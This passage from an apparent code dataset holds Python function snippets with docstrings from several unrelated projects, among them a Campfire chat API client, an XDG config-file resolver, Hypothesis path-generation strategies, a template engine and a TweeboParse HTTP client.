            "def get_users(self, sort=True):\n        \"\"\" Get list of users in the room.\n\n        Kwargs:\n            sort (bool): If True, sort rooms by name\n\n        Returns:\n            array. List of users\n        \"\"\"\n        self._load()\n        if sort:\n            self.users.sort(key=operator.itemgetter(\"name\"))\n        return self.users"
        ],
        [
            "def set_name(self, name):\n        \"\"\" Set the room name.\n\n        Args:\n            name (str): Name\n\n        Returns:\n            bool. Success\n        \"\"\"\n        if not self._campfire.get_user().admin:\n            return False\n\n        result = self._connection.put(\"room/%s\" % self.id, {\"room\": {\"name\": name}})\n        if result[\"success\"]:\n            self._load()\n        return result[\"success\"]"
        ],
        [
            "def set_topic(self, topic):\n        \"\"\" Set the room topic.\n\n        Args:\n            topic (str): Topic\n\n        Returns:\n            bool. Success\n        \"\"\"\n        if not topic:\n            topic = ''\n        result = self._connection.put(\"room/%s\" % self.id, {\"room\": {\"topic\": topic}})\n        if result[\"success\"]:\n            self._load()\n\n        return result[\"success\"]"
        ],
        [
            "def speak(self, message):\n        \"\"\" Post a message.\n\n        Args:\n            message (:class:`Message` or string): Message\n\n        Returns:\n            bool. Success\n        \"\"\"\n        campfire = self.get_campfire()\n        if not isinstance(message, Message):\n            message = Message(campfire, message)\n\n        result = self._connection.post(\n            \"room/%s/speak\" % self.id,\n            {\"message\": message.get_data()},\n            parse_data=True,\n            key=\"message\"\n        )\n\n        if result[\"success\"]:\n            return Message(campfire, result[\"data\"])\n        return result[\"success\"]"
        ],
        [
            "def get_xdg_dirs(self):\n        # type: () -> List[str]\n        \"\"\"\n        Returns a list of paths specified by the XDG_CONFIG_DIRS environment\n        variable or the appropriate default.\n\n        The list is sorted by precedence, with the most important item coming\n        *last* (required by the existing config_resolver logic).\n        \"\"\"\n        config_dirs = getenv('XDG_CONFIG_DIRS', '')\n        if config_dirs:\n            self._log.debug('XDG_CONFIG_DIRS is set to %r', config_dirs)\n            output = []\n            for path in reversed(config_dirs.split(':')):\n                output.append(join(path, self.group_name, self.app_name))\n            return output\n        return ['/etc/xdg/%s/%s' % (self.group_name, self.app_name)]"
        ],
        [
            "def get_xdg_home(self):\n        # type: () -> str\n        \"\"\"\n        Returns the value specified in the XDG_CONFIG_HOME environment variable\n        or the appropriate default.\n        \"\"\"\n        config_home = getenv('XDG_CONFIG_HOME', '')\n        if config_home:\n            self._log.debug('XDG_CONFIG_HOME is set to %r', config_home)\n            return expanduser(join(config_home, self.group_name, self.app_name))\n        return expanduser('~/.config/%s/%s' % (self.group_name, self.app_name))"
        ],
        [
            "def _effective_filename(self):\n        # type: () -> str\n        \"\"\"\n        Returns the filename which is effectively used by the application. If\n        overridden by an environment variable, it will return that filename.\n        \"\"\"\n        # same logic for the configuration filename. First, check if we were\n        # initialized with a filename...\n        config_filename = ''\n        if self.filename:\n            config_filename = self.filename\n\n        # ... next, take the value from the environment\n        env_filename = getenv(self.env_filename_name)\n        if env_filename:\n            self._log.info('Configuration filename was overridden with %r '\n                           'by the environment variable %s.',\n                           env_filename,\n                           self.env_filename_name)\n            config_filename = env_filename\n\n        return config_filename"
        ],
        [
            "def check_file(self, filename):\n        # type: (str) -> bool\n        \"\"\"\n        Check if ``filename`` can be read. Will return boolean which is True if\n        the file can be read, False otherwise.\n        \"\"\"\n        if not exists(filename):\n            return False\n\n        # Check if the file is version-compatible with this instance.\n        new_config = ConfigResolverBase()\n        new_config.read(filename)\n        if self.version and not new_config.has_option('meta', 'version'):\n            # self.version is set, so we MUST have a version in the file!\n            raise NoVersionError(\n                \"The config option 'meta.version' is missing in {}. The \"\n                \"application expects version {}!\".format(filename,\n                                                         self.version))\n        elif not self.version and new_config.has_option('meta', 'version'):\n            # Automatically \"lock-in\" a version number if one is found.\n            # This prevents loading a chain of config files with incompatible\n            # version numbers!\n            self.version = StrictVersion(new_config.get('meta', 'version'))\n            self._log.info('%r contains a version number, but the config '\n                           'instance was not created with a version '\n                           'restriction. Will set version number to \"%s\" to '\n                           'prevent accidents!',\n                           filename, self.version)\n        elif self.version:\n            # This instance expected a certain version. We need to check the\n            # version in the file and compare.\n            file_version = new_config.get('meta', 'version')\n            major, minor, _ = StrictVersion(file_version).version\n            expected_major, expected_minor, _ = self.version.version\n            if expected_major != major:\n                self._log.error(\n                    'Invalid major version number in %r. Expected %r, got %r!',\n                    abspath(filename),\n                    str(self.version),\n                    file_version)\n                return False\n\n            if expected_minor != minor:\n                self._log.warning(\n                    'Mismatching minor version number in %r. '\n                    'Expected %r, got %r!',\n                    abspath(filename),\n                    str(self.version),\n                    file_version)\n                return True\n        return True"
        ],
        [
            "def load(self, reload=False, require_load=False):\n        # type: (bool, bool) -> None\n        \"\"\"\n        Searches for an appropriate config file. If found, loads the file into\n        the current instance. This method can also be used to reload a\n        configuration. Note that you may want to set ``reload`` to ``True`` to\n        clear the configuration before loading in that case.  Without doing\n        that, values will remain available even if they have been removed from\n        the config files.\n\n        :param reload: if set to ``True``, the existing values are cleared\n                       before reloading.\n        :param require_load: If set to ``True`` this will raise a\n                             :py:exc:`IOError` if no config file has been found\n                             to load.\n        \"\"\"\n\n        if reload:  # pragma: no cover\n            self.config = None\n\n        # only load the config if necessary (or explicitly requested)\n        if self.config:  # pragma: no cover\n            self._log.debug('Returning cached config instance. Use '\n                            '``reload=True`` to avoid caching!')\n            return\n\n        path = self._effective_path()\n        config_filename = self._effective_filename()\n\n        # Next, use the resolved path to find the filenames. Keep track of\n        # which files we loaded in order to inform the user.\n        self._active_path = [join(_, config_filename) for _ in path]\n        for dirname in path:\n            conf_name = join(dirname, config_filename)\n            readable = self.check_file(conf_name)\n            if readable:\n                action = 'Updating' if self._loaded_files else 'Loading initial'\n                self._log.info('%s config from %s', action, conf_name)\n                self.read(conf_name)\n                if conf_name == expanduser(\"~/.%s/%s/%s\" % (\n                        self.group_name, self.app_name, self.filename)):\n                    self._log.warning(\n                        \"DEPRECATION WARNING: The file \"\n                        \"'%s/.%s/%s/app.ini' was loaded. The XDG \"\n                        \"Basedir standard requires this file to be in \"\n                        \"'%s/.config/%s/%s/app.ini'! This location \"\n                        \"will no longer be parsed in a future version of \"\n                        \"config_resolver! You can already (and should) move \"\n                        \"the file!\", expanduser(\"~\"), self.group_name,\n                        self.app_name, expanduser(\"~\"), self.group_name,\n                        self.app_name)\n                self._loaded_files.append(conf_name)\n\n        if not self._loaded_files and not require_load:\n            self._log.warning(\n                \"No config file named %s found! Search path was %r\",\n                config_filename,\n                path)\n        elif not self._loaded_files and require_load:\n            raise IOError(\"No config file named %s found! Search path \"\n                          \"was %r\" % (config_filename, path))"
        ],
        [
            "def get(self, q=None, page=None):\n        \"\"\"Get styles.\"\"\"\n        # Check cache to exit early if needed\n        etag = generate_etag(current_ext.content_version.encode('utf8'))\n        self.check_etag(etag, weak=True)\n\n        # Build response\n        res = jsonify(current_ext.styles)\n        res.set_etag(etag)\n\n        return res"
        ],
        [
            "def create_from_settings(settings):\n        \"\"\" Create a connection with given settings.\n\n        Args:\n            settings (dict): A dictionary of settings\n\n        Returns:\n            :class:`Connection`. The connection\n        \"\"\"\n        return Connection(\n            settings[\"url\"], \n            settings[\"base_url\"],\n            settings[\"user\"],\n            settings[\"password\"],\n            authorizations = settings[\"authorizations\"],\n            debug = settings[\"debug\"]\n        )"
        ],
        [
            "def delete(self, url=None, post_data={}, parse_data=False, key=None, parameters=None):\n        \"\"\" Issue a PUT request.\n\n        Kwargs:\n            url (str): Destination URL\n            post_data (dict): Dictionary of parameter and values\n            parse_data (bool): If true, parse response data\n            key (string): If parse_data==True, look for this key when parsing data\n            parameters (dict): Additional GET parameters to append to the URL\n\n        Returns:\n            dict. Response (a dict with keys: success, data, info, body)\n        \n        Raises:\n            AuthenticationError, ConnectionError, urllib2.HTTPError, ValueError, Exception\n        \"\"\"\n        return self._fetch(\"DELETE\", url, post_data=post_data, parse_data=parse_data, key=key, parameters=parameters, full_return=True)"
        ],
        [
            "def post(self, url=None, post_data={}, parse_data=False, key=None, parameters=None, listener=None):\n        \"\"\" Issue a POST request.\n\n        Kwargs:\n            url (str): Destination URL\n            post_data (dict): Dictionary of parameter and values\n            parse_data (bool): If true, parse response data\n            key (string): If parse_data==True, look for this key when parsing data\n            parameters (dict): Additional GET parameters to append to the URL\n            listener (func): callback called when uploading a file\n\n        Returns:\n            dict. Response (a dict with keys: success, data, info, body)\n        \n        Raises:\n            AuthenticationError, ConnectionError, urllib2.HTTPError, ValueError, Exception\n        \"\"\"\n        return self._fetch(\"POST\", url, post_data=post_data, parse_data=parse_data, key=key, parameters=parameters, listener=listener, full_return=True)"
        ],
        [
            "def get(self, url=None, parse_data=True, key=None, parameters=None):\n        \"\"\" Issue a GET request.\n\n        Kwargs:\n            url (str): Destination URL\n            parse_data (bool): If true, parse response data\n            key (string): If parse_data==True, look for this key when parsing data\n            parameters (dict): Additional GET parameters to append to the URL\n\n        Returns:\n            dict. Response (a dict with keys: success, data, info, body)\n\n        Raises:\n            AuthenticationError, ConnectionError, urllib2.HTTPError, ValueError, Exception\n        \"\"\"\n        return self._fetch(\"GET\", url, post_data=None, parse_data=parse_data, key=key, parameters=parameters)"
        ],
        [
            "def get_headers(self):\n        \"\"\" Get headers.\n\n        Returns:\n            tuple: Headers\n        \"\"\"\n        headers = {\n            \"User-Agent\": \"kFlame 1.0\"\n        }\n\n        password_url = self._get_password_url()\n        if password_url and password_url in self._settings[\"authorizations\"]:\n            headers[\"Authorization\"] = self._settings[\"authorizations\"][password_url]\n\n        return headers"
        ],
        [
            "def _get_password_url(self):\n        \"\"\" Get URL used for authentication\n\n        Returns:\n            string: URL\n        \"\"\"\n        password_url = None\n        if self._settings[\"user\"] or self._settings[\"authorization\"]:\n            if self._settings[\"url\"]:\n                password_url = self._settings[\"url\"]\n            elif self._settings[\"base_url\"]:\n                password_url = self._settings[\"base_url\"]\n        return password_url"
        ],
        [
            "def parse(self, text, key=None):\n        \"\"\" Parses a response.\n\n        Args:\n            text (str): Text to parse\n\n        Kwargs:\n            key (str): Key to look for, if any\n\n        Returns:\n            Parsed value\n\n        Raises:\n            ValueError\n        \"\"\"\n        try:\n            data = json.loads(text)\n        except ValueError as e:\n            raise ValueError(\"%s: Value: [%s]\" % (e, text))\n\n        if data and key:\n            if key not in data:\n                raise ValueError(\"Invalid response (key %s not found): %s\" % (key, data))\n            data = data[key]\n        return data"
        ],
        [
            "def build_twisted_request(self, method, url, extra_headers={}, body_producer=None, full_url=False):\n        \"\"\" Build a request for twisted\n\n        Args:\n            method (str): Request method (GET/POST/PUT/DELETE/etc.) If not specified, it will be POST if post_data is not None\n            url (str): Destination URL (full, or relative)\n\n        Kwargs:\n            extra_headers (dict): Headers (override default connection headers, if any)\n            body_producer (:class:`twisted.web.iweb.IBodyProducer`): Object producing request body\n            full_url (bool): If False, URL is relative\n\n        Returns:\n            tuple. Tuple with two elements: reactor, and request\n        \"\"\"\n        uri = url if full_url else self._url(url)\n\n        raw_headers = self.get_headers()\n        if extra_headers:\n            raw_headers.update(extra_headers)\n\n        headers = http_headers.Headers()\n        for header in raw_headers:\n            headers.addRawHeader(header, raw_headers[header])\n\n        agent = client.Agent(reactor)\n        request = agent.request(method, uri, headers, body_producer)\n\n        return (reactor, request)"
        ],
        [
            "def _fetch(self, method, url=None, post_data=None, parse_data=True, key=None, parameters=None, listener=None, full_return=False):\n        \"\"\" Issue a request.\n\n        Args:\n            method (str): Request method (GET/POST/PUT/DELETE/etc.) If not specified, it will be POST if post_data is not None\n\n        Kwargs:\n            url (str): Destination URL\n            post_data (str): A string of what to POST\n            parse_data (bool): If true, parse response data\n            key (string): If parse_data==True, look for this key when parsing data\n            parameters (dict): Additional GET parameters to append to the URL\n            listener (func): callback called when uploading a file\n            full_return (bool): If set to True, get a full response (with success, data, info, body)\n\n        Returns:\n            dict. Response. If full_return==True, a dict with keys: success, data, info, body, otherwise the parsed data\n\n        Raises:\n            AuthenticationError, ConnectionError, urllib2.HTTPError, ValueError\n        \"\"\"\n\n        headers = self.get_headers()\n        headers[\"Content-Type\"] = \"application/json\"\n\n        handlers = []\n        debuglevel = int(self._settings[\"debug\"])\n    \n        handlers.append(urllib2.HTTPHandler(debuglevel=debuglevel))\n        if hasattr(httplib, \"HTTPS\"):\n            handlers.append(urllib2.HTTPSHandler(debuglevel=debuglevel))\n\n        handlers.append(urllib2.HTTPCookieProcessor(cookielib.CookieJar()))\n\n        password_url = self._get_password_url()\n        if password_url and \"Authorization\" not in headers:\n            pwd_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()\n            pwd_manager.add_password(None, password_url, self._settings[\"user\"], self._settings[\"password\"])\n            handlers.append(HTTPBasicAuthHandler(pwd_manager))\n\n        opener = urllib2.build_opener(*handlers)\n\n        if post_data is not None:\n            post_data = json.dumps(post_data)\n\n        uri = self._url(url, parameters)\n        request = RESTRequest(uri, method=method, headers=headers)\n        if post_data is not None:\n            request.add_data(post_data)\n\n        response = None\n\n        try:\n            response = opener.open(request)\n            body = response.read()\n            if password_url and password_url not in self._settings[\"authorizations\"] and request.has_header(\"Authorization\"):\n                self._settings[\"authorizations\"][password_url] = request.get_header(\"Authorization\")\n        except urllib2.HTTPError as e:\n            if e.code == 401:\n                raise AuthenticationError(\"Access denied while trying to access %s\" % uri)\n            elif e.code == 404:\n                raise ConnectionError(\"URL not found: %s\" % uri)\n            else:\n                raise\n        except urllib2.URLError as e:\n            raise ConnectionError(\"Error while fetching from %s: %s\" % (uri, e))\n        finally:\n            if response:\n                response.close()\n\n            opener.close()\n\n        data = None\n        if parse_data:\n            if not key:\n                key = string.split(url, \"/\")[0]\n\n            data = self.parse(body, key)\n\n        if full_return:\n            info = response.info() if response else None\n            status = int(string.split(info[\"status\"])[0]) if (info and \"status\" in info) else None\n\n            return {\n                \"success\": (status >= 200 and status < 300), \n                \"data\": data, \n                \"info\": info, \n                \"body\": body\n            }\n\n        return data"
        ],
        [
            "def _url(self, url=None, parameters=None):\n        \"\"\" Build destination URL.\n\n        Kwargs:\n            url (str): Destination URL\n            parameters (dict): Additional GET parameters to append to the URL\n\n        Returns:\n            str. URL \n        \"\"\"\n\n        uri = url or self._settings[\"url\"]\n        if url and self._settings[\"base_url\"]:\n            uri = \"%s/%s\" % (self._settings[\"base_url\"], url)\n        uri += \".json\"\n        if parameters:\n            uri += \"?%s\" % urllib.urlencode(parameters)\n        return uri"
        ],
        [
            "def is_text(self):\n        \"\"\" Tells if this message is a text message.\n\n        Returns:\n            bool. Success\n        \"\"\"\n        return self.type in [\n            self._TYPE_PASTE,\n            self._TYPE_TEXT,\n            self._TYPE_TWEET\n        ]"
        ],
        [
            "def get_rooms(self, sort=True):\n        \"\"\" Get rooms list.\n\n        Kwargs:\n            sort (bool): If True, sort rooms by name\n\n        Returns:\n            array. List of rooms (each room is a dict)\n        \"\"\"\n        rooms = self._connection.get(\"rooms\")\n        if sort:\n            rooms.sort(key=operator.itemgetter(\"name\"))\n        return rooms"
        ],
        [
            "def get_room_by_name(self, name):\n        \"\"\" Get a room by name.\n\n        Returns:\n            :class:`Room`. Room\n\n        Raises:\n            RoomNotFoundException\n        \"\"\"\n        rooms = self.get_rooms()\n        for room in rooms or []:\n            if room[\"name\"] == name:\n                return self.get_room(room[\"id\"])\n        raise RoomNotFoundException(\"Room %s not found\" % name)"
        ],
        [
            "def get_room(self, id):\n        \"\"\" Get room.\n\n        Returns:\n            :class:`Room`. Room\n        \"\"\"\n        if id not in self._rooms:\n            self._rooms[id] = Room(self, id)\n        return self._rooms[id]"
        ],
        [
            "def get_user(self, id = None):\n        \"\"\" Get user.\n\n        Returns:\n            :class:`User`. User\n        \"\"\"\n        if not id:\n            id = self._user.id\n\n        if id not in self._users:\n            self._users[id] = self._user if id == self._user.id else User(self, id)\n\n        return self._users[id]"
        ],
        [
            "def search(self, terms):\n        \"\"\" Search transcripts.\n\n        Args:\n            terms (str): Terms for search\n\n        Returns:\n            array. Messages\n        \"\"\"\n        messages = self._connection.get(\"search/%s\" % urllib.quote_plus(terms), key=\"messages\")\n        if messages:\n            messages = [Message(self, message) for message in messages]\n        return messages"
        ],
        [
            "def attach(self, observer):\n        \"\"\" Attach an observer.\n\n        Args:\n            observer (func): A function to be called when new messages arrive\n\n        Returns:\n            :class:`Stream`. Current instance to allow chaining\n        \"\"\"\n        if not observer in self._observers:\n            self._observers.append(observer)\n        return self"
        ],
        [
            "def incoming(self, messages):\n        \"\"\" Called when incoming messages arrive.\n\n        Args:\n            messages (tuple): Messages (each message is a dict)\n        \"\"\"\n        if self._observers:\n            campfire = self._room.get_campfire()\n            for message in messages:\n                for observer in self._observers:\n                    observer(Message(campfire, message))"
        ],
        [
            "def fetch(self):\n        \"\"\" Fetch new messages. \"\"\"\n        try:\n            if not self._last_message_id:\n                messages = self._connection.get(\"room/%s/recent\" % self._room_id, key=\"messages\", parameters={\n                    \"limit\": 1\n                })\n                self._last_message_id = messages[-1][\"id\"]\n\n            messages = self._connection.get(\"room/%s/recent\" % self._room_id, key=\"messages\", parameters={\n                \"since_message_id\": self._last_message_id\n            })\n        except:\n            messages = []\n\n        if messages:\n            self._last_message_id = messages[-1][\"id\"]\n\n        self.received(messages)"
        ],
        [
            "def received(self, messages):\n        \"\"\" Called when new messages arrive.\n\n        Args:\n            messages (tuple): Messages\n        \"\"\"\n        if messages:\n            if self._queue:\n                self._queue.put_nowait(messages)\n\n            if self._callback:\n                self._callback(messages)"
        ],
        [
            "def connectionMade(self):\n        \"\"\" Called when a connection is made, and used to send out headers \"\"\"\n\n        headers = [\n            \"GET %s HTTP/1.1\" % (\"/room/%s/live.json\" % self.factory.get_stream().get_room_id())\n        ]\n\n        connection_headers = self.factory.get_stream().get_connection().get_headers()\n        for header in connection_headers:\n            headers.append(\"%s: %s\" % (header, connection_headers[header]))\n\n        headers.append(\"Host: streaming.campfirenow.com\")\n\n        self.transport.write(\"\\r\\n\".join(headers) + \"\\r\\n\\r\\n\")\n        self.factory.get_stream().set_protocol(self)"
        ],
        [
            "def lineReceived(self, line):\n        \"\"\" Callback issued by twisted when new line arrives.\n\n        Args:\n            line (str): Incoming line\n        \"\"\"\n        while self._in_header:\n            if line:\n                self._headers.append(line)\n            else:\n                http, status, message = self._headers[0].split(\" \", 2)\n                status = int(status)\n                if status == 200:\n                    self.factory.get_stream().connected()\n                else:\n                    self.factory.continueTrying = 0\n                    self.transport.loseConnection()\n                    self.factory.get_stream().disconnected(RuntimeError(status, message))\n                    return\n\n                self._in_header = False\n            break\n        else:\n            try:\n                self._len_expected = int(line, 16)\n                self.setRawMode()\n            except:\n                pass"
        ],
        [
            "def rawDataReceived(self, data):\n        \"\"\" Process data.\n\n        Args:\n            data (str): Incoming data\n        \"\"\"\n        if self._len_expected is not None:\n            data, extra = data[:self._len_expected], data[self._len_expected:]\n            self._len_expected -= len(data)\n        else:\n            extra = \"\"\n\n        self._buffer += data\n        if self._len_expected == 0:\n            data = self._buffer.strip()\n            if data:\n                lines = data.split(\"\\r\")\n                for line in lines:\n                    try:\n                        message = self.factory.get_stream().get_connection().parse(line)\n                        if message:\n                            self.factory.get_stream().received([message])\n                    except ValueError:\n                        pass\n\n            self._buffer = \"\"\n            self._len_expected = None\n            self.setLineMode(extra)"
        ],
        [
            "def styles(self):\n        \"\"\"Get a dictionary of CSL styles.\"\"\"\n        styles = get_all_styles()\n        whitelist = self.app.config.get('CSL_STYLES_WHITELIST')\n        if whitelist:\n            return {k: v for k, v in styles.items() if k in whitelist}\n        return styles"
        ],
        [
            "def startProducing(self, consumer):\n        \"\"\" Start producing.\n\n        Args:\n            consumer: Consumer\n        \"\"\"\n        self._consumer = consumer\n        self._current_deferred = defer.Deferred()\n        self._sent = 0\n        self._paused = False\n\n        if not hasattr(self, \"_chunk_headers\"):\n            self._build_chunk_headers()\n\n        if self._data:\n            block = \"\"\n            for field in self._data:\n                block += self._chunk_headers[field]\n                block += self._data[field]\n                block += \"\\r\\n\"\n\n            self._send_to_consumer(block)\n\n        if self._files:\n            self._files_iterator = self._files.iterkeys()\n            self._files_sent = 0\n            self._files_length = len(self._files)\n            self._current_file_path = None\n            self._current_file_handle = None\n            self._current_file_length = None\n            self._current_file_sent = 0\n\n            result = self._produce()\n            if result:\n                return result\n        else:\n            return defer.succeed(None)\n\n        return self._current_deferred"
        ],
        [
            "def _finish(self, forced=False):\n        \"\"\" Cleanup code after asked to stop producing.\n\n        Kwargs:\n            forced (bool): If True, we were forced to stop\n        \"\"\"\n        if hasattr(self, \"_current_file_handle\") and self._current_file_handle:\n            self._current_file_handle.close()\n        \n        if self._current_deferred:\n            self._current_deferred.callback(self._sent)\n            self._current_deferred = None\n\n        if not forced and self._deferred:\n            self._deferred.callback(self._sent)"
        ],
        [
            "def _send_to_consumer(self, block):\n        \"\"\" Send a block of bytes to the consumer.\n\n        Args:\n            block (str): Block of bytes\n        \"\"\"\n        self._consumer.write(block)\n        self._sent += len(block)\n        if self._callback:\n            self._callback(self._sent, self.length)"
        ],
        [
            "def _length(self):\n        \"\"\" Returns total length for this request.\n\n        Returns:\n            int. Length\n        \"\"\"\n        self._build_chunk_headers()\n\n        length = 0\n\n        if self._data:\n            for field in self._data:\n                length += len(self._chunk_headers[field])\n                length += len(self._data[field])\n                length += 2\n\n        if self._files:\n            for field in self._files:\n                length += len(self._chunk_headers[field])\n                length += self._file_size(field)\n                length += 2\n\n        length += len(self.boundary)\n        length += 6\n\n        return length"
        ],
        [
            "def _build_chunk_headers(self):\n        \"\"\" Build headers for each field. \"\"\"\n        if hasattr(self, \"_chunk_headers\") and self._chunk_headers:\n            return\n\n        self._chunk_headers = {}\n        for field in self._files:\n            self._chunk_headers[field] = self._headers(field, True)\n        for field in self._data:\n            self._chunk_headers[field] = self._headers(field)"
        ],
        [
            "def _file_size(self, field):\n        \"\"\" Returns the file size for given file field.\n\n        Args:\n            field (str): File field\n\n        Returns:\n            int. File size\n        \"\"\"\n        size = 0\n        try:\n            handle = open(self._files[field], \"r\")\n            size = os.fstat(handle.fileno()).st_size\n            handle.close()\n        except:\n            size = 0\n        self._file_lengths[field] = size\n        return self._file_lengths[field]"
        ],
        [
            "def _filename(draw, result_type=None):\n    \"\"\"Generate a path value of type result_type.\n\n    result_type can either be bytes or text_type\n\n    \"\"\"\n    # Various ASCII chars have a special meaning for the operating system,\n    # so make them more common\n    ascii_char = characters(min_codepoint=0x01, max_codepoint=0x7f)\n    if os.name == 'nt':  # pragma: no cover\n        # Windows paths can contain all surrogates and even surrogate pairs\n        # if two paths are concatenated. This makes it more likely for them to\n        # be generated.\n        surrogate = characters(\n            min_codepoint=0xD800, max_codepoint=0xDFFF)\n        uni_char = characters(min_codepoint=0x1)\n        text_strategy = text(\n            alphabet=one_of(uni_char, surrogate, ascii_char))\n\n        def text_to_bytes(path):\n            fs_enc = sys.getfilesystemencoding()\n            try:\n                return path.encode(fs_enc, 'surrogatepass')\n            except UnicodeEncodeError:\n                return path.encode(fs_enc, 'replace')\n\n        bytes_strategy = text_strategy.map(text_to_bytes)\n    else:\n        latin_char = characters(min_codepoint=0x01, max_codepoint=0xff)\n        bytes_strategy = text(alphabet=one_of(latin_char, ascii_char)).map(\n            lambda t: t.encode('latin-1'))\n\n        unix_path_text = bytes_strategy.map(\n            lambda b: b.decode(\n                sys.getfilesystemencoding(),\n                'surrogateescape' if PY3 else 'ignore'))\n\n        # Two surrogates generated through surrogateescape can generate\n        # a valid utf-8 sequence when encoded and result in a different\n        # code point when decoded again. Can happen when two paths get\n        # concatenated. Shuffling makes it possible to generate such a case.\n        text_strategy = permutations(draw(unix_path_text)).map(u\"\".join)\n\n    if result_type is None:\n        return draw(one_of(bytes_strategy, text_strategy))\n    elif result_type is bytes:\n        return draw(bytes_strategy)\n    else:\n        return draw(text_strategy)"
        ],
        [
            "def _str_to_path(s, result_type):\n    \"\"\"Given an ASCII str, returns a path of the given type.\"\"\"\n\n    assert isinstance(s, str)\n    if isinstance(s, bytes) and result_type is text_type:\n        return s.decode('ascii')\n    elif isinstance(s, text_type) and result_type is bytes:\n        return s.encode('ascii')\n    return s"
        ],
        [
            "def _path_root(draw, result_type):\n    \"\"\"Generates a root component for a path.\"\"\"\n\n    # Based on https://en.wikipedia.org/wiki/Path_(computing)\n\n    def tp(s=''):\n        return _str_to_path(s, result_type)\n\n    if os.name != 'nt':\n        return tp(os.sep)\n\n    sep = sampled_from([os.sep, os.altsep or os.sep]).map(tp)\n    name = _filename(result_type)\n    char = characters(min_codepoint=ord(\"A\"), max_codepoint=ord(\"z\")).map(\n        lambda c: tp(str(c)))\n\n    relative = sep\n    # [drive_letter]:\\\n    drive = builds(lambda *x: tp().join(x), char, just(tp(':')), sep)\n    # \\\\?\\[drive_spec]:\\\n    extended = builds(\n        lambda *x: tp().join(x), sep, sep, just(tp('?')), sep, drive)\n\n    network = one_of([\n        # \\\\[server]\\[sharename]\\\n        builds(lambda *x: tp().join(x), sep, sep, name, sep, name, sep),\n        # \\\\?\\[server]\\[sharename]\\\n        builds(lambda *x: tp().join(x),\n               sep, sep, just(tp('?')), sep, name, sep, name, sep),\n        # \\\\?\\UNC\\[server]\\[sharename]\\\n        builds(lambda *x: tp().join(x),\n               sep, sep, just(tp('?')), sep, just(tp('UNC')), sep, name, sep,\n               name, sep),\n        # \\\\.\\[physical_device]\\\n        builds(lambda *x: tp().join(x),\n               sep, sep, just(tp('.')), sep, name, sep),\n    ])\n\n    final = one_of(relative, drive, extended, network)\n\n    return draw(final)"
        ],
        [
            "def fspaths(draw, allow_pathlike=None):\n    \"\"\"A strategy which generates filesystem path values.\n\n    The generated values include everything which the builtin\n    :func:`python:open` function accepts i.e. which won't lead to\n    :exc:`ValueError` or :exc:`TypeError` being raised.\n\n    Note that the range of the returned values depends on the operating\n    system, the Python version, and the filesystem encoding as returned by\n    :func:`sys.getfilesystemencoding`.\n\n    :param allow_pathlike:\n        If :obj:`python:None` makes the strategy include objects implementing\n        the :class:`python:os.PathLike` interface when Python >= 3.6 is used.\n        If :obj:`python:False` no pathlike objects will be generated. If\n        :obj:`python:True` pathlike will be generated (Python >= 3.6 required)\n\n    :type allow_pathlike: :obj:`python:bool` or :obj:`python:None`\n\n    .. versionadded:: 3.15\n\n    \"\"\"\n    has_pathlike = hasattr(os, 'PathLike')\n\n    if allow_pathlike is None:\n        allow_pathlike = has_pathlike\n    if allow_pathlike and not has_pathlike:\n        raise InvalidArgument(\n            'allow_pathlike: os.PathLike not supported, use None instead '\n            'to enable it only when available')\n\n    result_type = draw(sampled_from([bytes, text_type]))\n\n    def tp(s=''):\n        return _str_to_path(s, result_type)\n\n    special_component = sampled_from([tp(os.curdir), tp(os.pardir)])\n    normal_component = _filename(result_type)\n    path_component = one_of(normal_component, special_component)\n    extension = normal_component.map(lambda f: tp(os.extsep) + f)\n    root = _path_root(result_type)\n\n    def optional(st):\n        return one_of(st, just(result_type()))\n\n    sep = sampled_from([os.sep, os.altsep or os.sep]).map(tp)\n    path_part = builds(lambda s, l: s.join(l), sep, lists(path_component))\n    main_strategy = builds(lambda *x: tp().join(x),\n                           optional(root), path_part, optional(extension))\n\n    if allow_pathlike and hasattr(os, 'fspath'):\n        pathlike_strategy = main_strategy.map(lambda p: _PathLike(p))\n        main_strategy = one_of(main_strategy, pathlike_strategy)\n\n    return draw(main_strategy)"
        ],
        [
            "def _exec(self, globals_dict=None):\n        \"\"\"exec compiled code\"\"\"\n        globals_dict = globals_dict or {}\n        globals_dict.setdefault('__builtins__', {})\n        exec(self._code, globals_dict)\n        return globals_dict"
        ],
        [
            "def handle_extends(self, text):\n        \"\"\"replace all blocks in extends with current blocks\"\"\"\n        match = self.re_extends.match(text)\n        if match:\n            extra_text = self.re_extends.sub('', text, count=1)\n            blocks = self.get_blocks(extra_text)\n            path = os.path.join(self.base_dir, match.group('path'))\n            with open(path, encoding='utf-8') as fp:\n                return self.replace_blocks_in_extends(fp.read(), blocks)\n        else:\n            return None"
        ],
        [
            "def flush_buffer(self):\n        \"\"\"flush all buffered string into code\"\"\"\n        self.code_builder.add_line('{0}.extend([{1}])',\n                                   self.result_var, ','.join(self.buffered))\n        self.buffered = []"
        ],
        [
            "def add_data(self, data):\n        \"\"\" Add POST data.\n\n        Args:\n            data (dict): key => value dictionary\n        \"\"\"\n        if not self._data:\n            self._data = {}\n        self._data.update(data)"
        ],
        [
            "def log_error(self, text: str) -> None:\n        '''\n        Given some error text it will log the text if self.log_errors is True\n\n        :param text: Error text to log\n        '''\n        if self.log_errors:\n            with self._log_fp.open('a+') as log_file:\n                log_file.write(f'{text}\\n')"
        ],
        [
            "def parse_conll(self, texts: List[str], retry_count: int = 0) -> List[str]:\n        '''\n        Processes the texts using TweeboParse and returns them in CoNLL format.\n\n        :param texts: The List of Strings to be processed by TweeboParse.\n        :param retry_count: The number of times it has retried for. Default\n                            0 does not require setting, main purpose is for\n                            recursion.\n        :return: A list of CoNLL formated strings.\n        :raises ServerError: Caused when the server is not running.\n        :raises :py:class:`requests.exceptions.HTTPError`: Caused when the\n                input texts is not formated correctly e.g. When you give it a\n                String not a list of Strings.\n        :raises :py:class:`json.JSONDecodeError`: Caused if after self.retries\n                attempts to parse the data it cannot decode the data.\n\n        :Example:\n\n        '''\n        post_data = {'texts': texts, 'output_type': 'conll'}\n        try:\n            response = requests.post(f'http://{self.hostname}:{self.port}',\n                                     json=post_data,\n                                     headers={'Connection': 'close'})\n            response.raise_for_status()\n        except (requests.exceptions.ConnectionError,\n                requests.exceptions.Timeout) as server_error:\n            raise ServerError(server_error, self.hostname, self.port)\n        except requests.exceptions.HTTPError as http_error:\n            raise http_error\n        else:\n            try:\n                return response.json()\n            except json.JSONDecodeError as json_exception:\n                if retry_count == self.retries:\n                    self.log_error(response.text)\n                    raise Exception('Json Decoding error cannot parse this '\n                                    